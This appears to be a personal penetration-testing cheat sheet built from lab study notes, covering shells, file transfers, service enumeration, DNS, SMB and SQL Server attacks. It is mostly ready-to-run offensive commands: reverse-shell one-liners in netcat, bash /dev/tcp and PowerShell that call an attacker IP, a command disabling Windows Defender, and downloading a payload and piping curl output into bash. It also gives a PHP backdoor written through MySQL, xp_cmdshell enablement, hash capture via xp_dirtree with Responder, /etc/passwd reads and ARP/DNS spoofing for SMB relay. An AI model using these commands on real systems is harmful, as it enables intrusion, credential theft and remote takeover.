
# Shells

Sometimes Windows Defender does not allow connections
- To disable: open Powershell as administrator and `Set-MpPreference -DisableRealtimeMonitoring $true`

Listener:
- `nc` obviously
- `rlwrap nc -lvnp 8080` rlwrap enhances keyboard usage with shell
- `ncat --ssl -lvnp` provides extra features like encryption 
- `socat -d -d TCP-LISTEN:[port] STDOUT` creates a socket connection

# One-Liners

Netcat/Bash Reverse
- `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f`
	- removes `tmp/f`
	- makes the FIFO named pipe (https://man7.org/linux/man-pages/man7/fifo.7.html) as the new `/tmp/f` file
	- cat and pipe to `/bin/bash -i 2>&1` , `-i` makes the shell interactive, and STDERR and STDOUT are redirected to the `nc` command so the attacker can see errors
	- `nc` outputs to `/tmp/f` serving the bash shell to the listener
- `bash -i >& /dev/tcp/[attacker IP]/[port] 0>&1` connects to attacker's listener port


Powershell
- `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.42.2',6666);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`


# File Transfers

### No Network Comms

File Hash and Base64 encoding
- `md5sum [file]`
- `cat [file] | base64 -w 0;echo`
- Target: `echo -n '[base64 string]' | base64 -d > [output]`
- check sum again

Windows encode syntax
- `certutil -encodehex -f "[file]" "output.txt" 0x40000001 1>nul`

### Network Comms

`wget [link] -O [output]`
`curl [link] -o [output]` 
additionally, instead of supplying an out file, you can execute files by piping directly into `python3` or `bash` 

Powershell wget equivalent: `powershell Invoke-WebRequest -Uri http://10.8.30.155:1337/reverse.exe -Outfile reverse.exe`

`python3 -m uploadserver` or `http.server`

`php -S [IP:port]`

Impacket smbserver
`smbserver.py`
	- `impacket-smbserver -smb2support CompData [directory for server location]`
	- `CompData` is the name that the target will use to refer to the share.
	- To transfer from target (windows example): `move [file] \\[host-IP]\CompData`


### File Transfers with Code

Python
- `python3 -c 'import urllib.request;urllib.request.urlretrieve("[URL to file]", "[output]")'`

PHP
- `php -r '$file = file_get_contents("[file URL]"); file_put_contents("[output]",$file);'`


# IMPACKET Modules

`/home/kali/Documents/impacket/examples`


#### mssql
- add `-windows-auth` for a windows machine
- `python3 mssqlclient.py [user]@[target]`
- https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#manual-enumeration
- https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
	- `SELECT is_srvrolemember('sysadmin');` returned `1` meaning `true`

#### smbserver
- `smbserver.py`
	- `impacket-smbserver -smb2support CompData [directory for server location]`
	- `CompData` is the name that the target will use to refer to the share.
	- To transfer from target (windows example): `move [file] \\[host-IP]\CompData`

#### PSexec and SMBexec

# Common Services

See `Password Attacks` for brute forcing

RSYNC, 873
- service for locally and remotely copying files
- `nc -nv [IP] 873` to find shares
- `rsync -avz --list-only rsync://[IP]/` add a `[share]` at the end to enumerate a specific share
-  to download files, remove `--list-only` and add the `/share/file` at the end of the address and a `/local/destination`
- use rsync over ssh https://phoenixnap.com/kb/how-to-rsync-over-ssh

FTP, listens on 21
- `ftp user@[IP] -P [port]`
- `/etc/ftpusers` is where users are stored
- `/etc/vsftpd.conf` is config for vsFTPd server
- recursive listing - `ls -R` when logged in
- FTP Bounce Attack
	- Use an intermediary machine running FTP to access an internal target
	- In this example we are bouncing the nmap command to enumerate port 80 on the internal target by using the `-b` flag
	- `nmap -p80 -b [user]:[pass]@[intermediary_IP] [target_IP]`

SQL, 1433, 1434,
- MySQL is on 3306
- MSSQL is on 2433 when in hidden mode
- See `MySQL` and `MSSQL` notes

SSH, 22
- `ssh-audit.py`
- brute force: `ssh user@ip -o PreferredAuthentications=password`
	- once you get credentials:
	- `ssh -i id_rsa user@[IP]`
	- remember to `chmod`

SCP, 22
- secure copy protocol
- client for downloading files over SSH
- `scp username@IP:/path_to_file [output destination]`

TELNET, 23
- remote CLI tool
- Can be used with SMTP, IRC, HTTP, FTP, or POP3



SMTP, 25, 587
- can use telnet
- metasploit: `smtp_version`, `smtp_enum`
- `nmap --script smtp-open-relay`
- `nmap --script banner,*smtp*`
- When connected, you can use `VRFY [user]` to check if a user exists
- https://github.com/pentestmonkey/smtp-user-enum use this perl script to enumerate users with a wordlist.
	- Ex. `smtp-user-enum -M VRFY -U user.list -D inlanefreight.htb -t [IP]`
	- `VRFY` is the method used for enumerating, can also be `EXPN` or `RCPT`
- https://github.com/pentestmonkey/smtp-user-enum Office365 Spray
	- `python3 o365spray --enum -U users.txt --domain domain`

POP3, 110
- can use telnet
- once connected:
	- `USER [user]`
	- `PASS [password]`
	- `STAT` confirms connection
	- `LIST` shows messages
- to interact over an SSL encrypted  server, use `openssl s_client -connect [IP]:pop3s`
- server commands: 
	-  https://academy.hackthebox.com/module/112/section/1073
	-  https://medium.com/@timothy.tanzijing/footprinting-htb-imap-pop3-writeup-5e5c99547f8a

IMAP, 143
- `LOGIN [username] [password]`
- each command requires a random string to track replies. use c1, c2, c3, etc.
- `LIST "" "*" 23`
-  to interact over an SSL encrypted  server, use `openssl s_client -connect [IP]:imaps`
- server commands https://academy.hackthebox.com/module/112/section/1073, https://medium.com/@timothy.tanzijing/footprinting-htb-imap-pop3-writeup-5e5c99547f8a


NFS, port 111, 2049
- may show up as RPC (remote procedure call)
- `showmount -e [IP]` enumerate shares
- install `nfs-common`
- create folder to mount file share `mkdir /tmp/mount`
- `sudo mount -t nfs [IP]:/[share_path] [mount_path]`

SNMP, 161, 162
- `snmpwalk -v2c -c public [IP]`
	-  try `backup` instead of `public`
	- the version (`-v`) you need to find with enumerating
	- `-c` is the name of the community string (get these with the nmap script below)
- `onesixtyone` brute force
	- `onesixtyone -c [wordlist] [IP]`
- Once you enumerate a community string with `snmpwalk` or `onesixtyone`, use `braa [string]@IP:.1.3.6.*`
- nmap script `snmp-*` and save to an output file. Or just use `snmp-brute`

WInRM, 5985,5986
- might show as `wsman`
- `evil-winrm`
- try to get credentials from conducting password attacks on other services

# DNS

dnsdumpster.com

### Tools

DNSenum
- discovers subdomains and gathers DNS info
- dictionary, brute-forcing, zone transfers
- `-r`- recursive option
- `dnsenum --enum [domain] -f [wordlist] -r`
- `dnsenum --dnsserver [IP] -f [wordlist] [domain]`
- use `dnsenum` on any subdomains found with `axfr` from dig

Dig
- `dig [record type] [domain] @[IP]`
-  record types: `ns, A, AAAA, CNAME, TXT, MX, SOA, axfr, any`
	- `axfr` does a zone transfer when you find a valid subdomain. Finds internal DNS servers
	-  Continue to run `axfr` with each subdomain you discover. May need to update `/etc/hosts`
	- add `dig @[IP] [domain]` to query a specific name server (the IP)
- Reverse lookup: `dig -x [IP]`

Fierce
- `fierce --domain [domain]` enumerates DNS servers of a root domain and scans for the DNS zone transfer

Subdomain Enumeration
- `Subfinder -d [domain] -v``
- `Sublist3r`
- `Subbrute` good for internal hosts with no internet access, allows for self-defined resolvers in the `resolvers.txt` file
	- navigate to `subbrute` directory
	- add the domain name to `resolvers.txt`
	- `python 3 subbrute inlanefreight.com -s names.txt -r resolvers.txt`

Gobuster
- subdomains, directories, vhost, etc.
- `-t` number of threads
- `-k` ignores SSL/TLS certificate errors
- `-o` saves to a file
- dir mode: `-x.txt,.html` etc.

DNS Spoofing Attack
- Perform Local DNS Cache Poisoning with `Ettercap` or `Bettercap`
- `Ettercap`
	- edit `/etc/ettercap/etter.dns` to map the target domain name that you want to spoof and the attacker IP for redirection (ex. `inlanefreight.com    A    [IP]`)
	- Run `ettercap`, and `Hosts > Scan for Hosts`
	- Add target IP to `target 1` and add a default gateway to `target 2` 
	- activate `dns_spoof` with `Plugins > Manage Plugins` 
#### How DNS works

Process
- hosts file first
-  local cache
- DNS resolver (ISP or public resolver like Google DNS)
- Root name server
- TLD (top-level domain) Server (there is a .com server, .org, etc.)
- Authoritative server (managed by hosting providers or domain registrars)

Record Types
- A: IPv4 addresses
- AAAA: IPv6 addresses
- CNAME: alias for a hostname, pointing to another hostname
- MX: mail exchange record
- NS: Name server record, delegates a DNS zone to a specific authoritative name server
- TXT: text record
- SOA: start of authority record, specifies administrative info about a DNS zone
- SRV: Service record
- PTR: pointer record, used for reverse DNS lookups, mapping an IP address to a hostname

Zone Transfer
- Zone: part of a domain namespace that an entity or admin manages
- (example.com, mail.example.com, blog.example.com are all in the same DNS zone). 
- The zone file resides on a DNS server



# SMB/MSRPC


SMB, 139 and 445

See `brute forcing` notes for additional help
You may need to add the domain name with `crackmapexec` to brute force properly. `-d [domain]`

- `enum4linux-ng`
	- `-A` for enumerate all things
	- `-s [file]` brute force guess for shares 
	- `-u` specify user
	- `-C` get MSRPC services
- `smbclient //[IP]/[share]` 
	- `-U` user or `-U user%password`
	- `-p` port
	- `-L` list available services/shares `-L //IP/`
	- `-N` NULL session if smb is configured to allow anonymous login
- `smbmap`
	- `-H [IP]`
	- `-r` to list a share
	- `-R` recursive share listing
	- `-u` username
	- `-p` password
	- `-d` domain name (default is WORKGROUP)
	- `--download "[share]/[file]"`
- `smbget` for downloading share data
	- `smbget --recursive smb://IP/[share]/[file]`
	- `nmap --script smb-os-discovery.nse`
- `rpcclient`
	- cheat sheet - https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf 

 PSExec
- execute processes on other systems. Uses SMB to access other computers.
- `impacket-psexec -h`
- `impacket-smbexec` 
- `netexec` has an implementation of smbexec and psexec
- Metasploit has a PsExec implementation

Responder
- Creates a fake SMB Server to capture NTLM hashes
- `responder -I` creates SMB server with default configuration


SMB Info:
- Originally ran on top of NETBIOS over TCP/IP, but Windows implemented SMB directly over TCP port 445. If SMB is running over 139 it means NetBIOS is enabled or you are targeting a non-windows host.
- MSRPC is another protocol related to SMB. RPC allows application developers a way to communicate with local or remote processes without having to understand the network protcols.

## SMB Relay Attack

exploit existing smb connection to execute payloads between different machines on a network

Outline:
1. Intercept by setting up MITM between client and server
2. Capture authentication data 
3. Relay to a legitimate server
4. Gain access with the payload/credentials you used

In this example:
- Client: 172.16.5.5
- Target: 172.16.5.10
- Attacker: 172.16.5.101

INE example sequence:
- `smb_relay` in MSF, set `SRVHOST` and `LHOST` to attacker IP
- set `SMBHOST` to the client IP. They are running SMB that we will be intercepting
- set up a fake host resolution file: `echo "[Attacker-IP] *.[Top-Level-Domain]" > [output]`
	- the `*` will resolve your IP to anything in the target domain. the lab example from INE was `*.sportsfoo.com`
- `dnsspoof -i [attacker interface] -f [fake_host_file]`
	- interface is the IP of the network we are spoofing on
- `echo 1 > /proc/sys/net/ipv4/ip_forward
- in two new tabs:
	- `arpspoof -i eth1 -t [client IP] [gateway IP]`
	- `arpspoof -i eth1 -t [gateway IP] [client IP]`
- go back and run the MSF module. now wait for a request on the `dnsspoof` tab

# MySQL Database

TCP port 3306

`sqlcmd` with credentials to connect to a database

`mysql` client
- `--skip-ssl` if you get the ssl error message
- `-u user`
- `-h [IP]`
- `-p` with no argument, it will prompt you for the password

You may need to add `GO` after an SQL query to run it

`nmap --script mysql*`
- `use mysql;` once logged in

If connected to the target and using MYSQL through shell, here are some navigation concepts:
- Database -> Tables -> Columns and Rows
- `show databases;`
- `use [db];`
- `show tables;`

To execute system commands:
- we may be able to write to a location in the file system
- `SELECT "" INTO OUTFILE '/var/www/html/[new_shell_file]';`
	- Ex. `SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoor.php";`
	- Verify it worked with `SELECT LOAD_FILE (C:\\xampp\\htdocs\\backdoor.php");`
	- You will have to investigate where the default web directory location is on the machine. This example used an xampp server on a windows machine.
	- in a PHP server, you can visit this new file you created and issue a command in the URL, `http://[IP]/backdoor.php?cmd= dir c:\users\ /s flag.txt`

Read files with MySQL: `select LOAD_FILE("/etc/passwd");`

# Windows Protocols


MSRPC. 135
- `rpcclient [IP] -U [user]` for MS-RPC
		- once authenticated, try these commands:
		- `srvinfo`
		- `enumdomains`
		- `netshareenumall`
		- `enumdomusers`
		- `queryuser [RID]`
 
WinRM, 5985, 5986
	- `evil-winrm -i [IP] -u [user] -p [pass]`

WMI, 135
	- impacket `wmiexec.py user:"[pass]"@[IP] "[hostname]"`

## RDP

port 3389
Clients: xfreerdp, remmina, rdesktop

Bluekeep Vuln: https://unit42.paloaltonetworks.com/exploitation-of-windows-cve-2019-0708-bluekeep-three-ways-to-write-data-into-the-kernel-with-rdp-pdu/
#### Session Hijacking (need System privs)
- `tscon.exe` Microsoft binary https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/tscon
- `tscon #[target_session_ID] /dest:#[current_session]`
- `query user` in cmd to see session names
- If you don't have system privs, try [[Privilege Escalation.canvas|Privilege Escalation]] 

#### RDP PtH
- You will need `Restricted Admin Mode` enabled (it's disabled by default)
- `reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f` This command adds a new registry key
- Now you can use `xfreerdp` with the `/pth` option

## MSSQL

Port 1433
if logged onto a command prompt on the machine, connect with the local mssql server with `sqlcmd`

Clients:
- From linux you can use `sqsh` to connect to MSSQL servers
	- MSSQL supports windows account authentication as well, you can use the same credentials
	- If using Windows Authentication credentials, you need to add `.\\accountname` or `[servername]\\[accountname]` to the domain or hostname to the command:
	- `sqsh -S [IP] .\\[user] -P '[pass]' -h`
- `impacket-mssqlclient`, may need to add `-windows-auth` if using windows account credentials

MSSQL Syntax:
- Show databases: `SELECT name FROM master.dbo.sysdatabases` 
- `USE [database]`
- Show tables in a database: `SELECT * FROM [db].INFORMATION_SCHEMA.TABLES`
- Select all available entries from a table: `SELECT * FROM [table]`
- Read local files: `SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents`

Nmap Scripts
`sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p[port] [IP]`

xp_cmdshell
- `xp_cmdshell "command"` in an interactive sql session to execute commands. You may need to add `exec` at the beginning 
- TO ENABLE xp_cmdshell:
	- You must be system administrator or `sa` (I think) or have similar permissions
	- `EXEC sp_configure 'show advanced options', '1'`
	- `RECONFIGURE`
	- `EXEC sp_configure 'xp_cmdshell', '1'`
	- `RECONFIGURE`


metasploit `mssql_ping` scanner, `mssql_login`
- if you start a metasploit session using one of the modules, add the `mssql_enum` to see what commands work in the session
- go back to the session you opened, use `query_interactive` and then try some such as `xp_cmdshell "dir C:\"`


Other Clients
- `locate mssqlclient` to find what you have
- SQL Server Management Studio (SSMS)
- `mssql-cli`
- SQL Server Powershell
- HeidiSQL
- SQLPro
- Impacket: `mssqlclient.py`
- `sqsh`
- `netexec mssql`


### Capture MSSQL Service Hash

Note: This is a windows authentication account, not necessarily an account set up with the MSSQL database

First, start `sudo responder -I tun0` or `sudo impacket-smbserver share./ -smb2support`

on MSSQL Session
- `EXEC master..xp_dirtree '\\[IP]\share\'`
- OR `EXEC master..xp_subdirs '\\[IP]\share\`
- responder should capture the hash

### Enumerate User Privs and Impersonations

Verify current user and role:
```cmd-session
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go
```

Identify users you can impersonate with the MSSQL account:
```cmd-session
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO
```

Impersonate a user (this example is the `sa` user and we issued a command asking if they were a sysadmin):
```cmd-session
1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO
```

#### Use Linked Servers

Identify linked servers with the MSSQL service:
```
1> SELECT srvname, isremote FROM sysservers
2> GO
```

EXECUTE to send pass-through commands to identified linked server (In this example, the identified server was `10..0.0.12\SQLEXPRESS` and we are passing the command to ask who has the sysadmin role):
```
1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
2> GO
```

#### Write Files with MSSQL

```cmd-session
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, ''
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```

#### Read Files with MSSQL

```sqlcmd session
1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
2> GO
```